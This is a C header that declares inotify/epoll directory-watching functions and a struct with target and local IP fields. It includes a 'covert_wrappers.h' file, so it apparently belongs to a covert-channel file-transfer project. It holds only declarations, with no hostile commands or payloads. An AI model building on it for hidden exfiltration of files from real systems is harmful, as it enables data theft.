#ifndef INOTIFY_H
#define INOTIFY_H

#include <sys/inotify.h>
#include <sys/epoll.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include "epoll.h"
#include "covert_wrappers.h"
#include <stdbool.h>
#include <stdio.h>

#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUFLEN (1024 * (EVENT_SIZE + 16))

typedef struct {
    char directory[BUFSIZ];
    char file[BUFSIZ];
    char targetip[BUFSIZ];
    char localip[BUFSIZ];
    bool tcp;
} inotify_struct;

void *watch_directory(void* args);
void *recv_watch_directory(void* args);
int initInotify();
int addWatch(int socket, char *directory);


#endif
